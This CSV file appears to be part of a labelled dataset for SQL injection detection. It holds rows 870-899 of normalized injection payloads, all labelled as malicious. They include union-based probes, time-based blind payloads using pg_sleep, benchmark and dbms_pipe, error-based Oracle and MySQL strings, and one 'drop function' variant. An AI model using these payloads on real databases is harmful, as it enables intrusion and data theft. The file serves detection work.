row_index,payload_norm,label,sqli_type_hint
870,"select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and ( 'njnr' = 'njnr",1,
871,select case when 6558 = 4327 then 1 else null end--,1,
872,-7535 ) or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ),1,
873,"end and ( ( ""rqay"" like ""rqay",1,
874,"-2312' ) ) ) union all select 5282,5282,5282,5282,5282,5282,5282,5282--",1,
875,"1%"" ) ) and 8594 = ( select 8594 from pg_sleep ( 5 ) ) --",1,
876,select ( case when ( 8993 = 8846 ) then 8993 else 8993* ( select 8993 from mysql.db ) end ) #,1,
877,"select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and ( '%' = '",1,
878,"select pg_sleep ( 5 ) and ( ""%"" = """,1,
879,"call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null ) and ( ( 4142 = 4142",1,
880,"-8153' ) as qhlb where 4948 = 4948 union all select 4948,4948,4948,4948,4948,4948#",1,
881,-7319 or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4493 = 4493 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ),1,
882,"1' ) ) as bedq where 8781 = 8781 or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) --",1,
883,"1%"" ) and 2006 = 2006",1,
884,"-5139 ) ) union all select 3373,3373,3373,3373,3373,3373,3373,3373#",1,
885,"1 or 4411 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) # zcyc",1,
886,"1' ) as rvch where 1863 = 1863 or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",1,
887,"1 and 8514 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) -- loao",1,
888,-9446 ) ) as wmrq where 3705 = 3705 union all select 3705#,1,
889,"iif ( 7889 = 5114,1,1/0 )",1,
890,"select dbms_pipe.receive_message ( chr ( 66 ) ||chr ( 67 ) ||chr ( 79 ) ||chr ( 101 ) ,5 ) from dual and ( 'ztmd' = 'ztmd",1,
891,"1"" ) ) union all select null,null,null,null,null,null,null,null#",1,
892,"1%' ) ) and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 ) = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --",1,
893,"1%' ) and elt ( 4249 = 4249,7259 ) and ( '%' = '",1,
894,1' ) where 4867 = 4867 rlike ( select ( case when ( 7689 = 7689 ) then 1 else 0x28 end ) ) --,1,
895,if ( 8858 = 5680 ) select 8858 else drop function pyuo--,1,
896,"1 ) ) ) procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50 ) ) ) ) ) ,1 ) and ( ( ( 1748 = 1748",1,
897,"1"" ) ) as klie where 2840 = 2840 or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c ) ) #",1,
898,-3859 ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( 5846 = 5846,1,
899,"end and ( ""qkkn"" like ""qkkn",1,
